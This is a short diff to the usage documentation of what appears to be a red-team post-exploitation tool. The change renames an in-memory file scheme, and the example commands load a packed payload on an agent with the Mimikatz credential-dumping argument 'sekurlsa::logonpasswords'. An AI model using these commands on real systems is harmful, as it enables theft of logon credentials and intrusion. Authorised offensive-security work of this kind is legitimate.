@@ -32,12 +32,12 @@ crystal_pack --dll /path/to/postex.dll --args "sekurlsa::logonpasswords exit"
 
 ```text
 crystal_kit --file /path/on/agent/to/payload.pico.bin
-crystal_kit --file mem:///payload.pico.bin
-crystal_kit --file mem:///payload.pico.bin --args "sekurlsa::logonpasswords exit"
+crystal_kit --file memfs:///payload.pico.bin
+crystal_kit --file memfs:///payload.pico.bin --args "sekurlsa::logonpasswords exit"
 ```
 
 - `--file` is the Crystal Palace PICO `.bin` on the agent (local path or
-  `mem:///...`).
+  `memfs:///...`).
 - `--args` is an optional runtime string delivered to the PICO entry and then
   to the post-ex DLL's `DllMain` (`lpReserved` on `DLL_PROCESS_ATTACH`) as
   `<write_handle_hex>|<args>`. The packed DLL can stream stdout/stderr to that
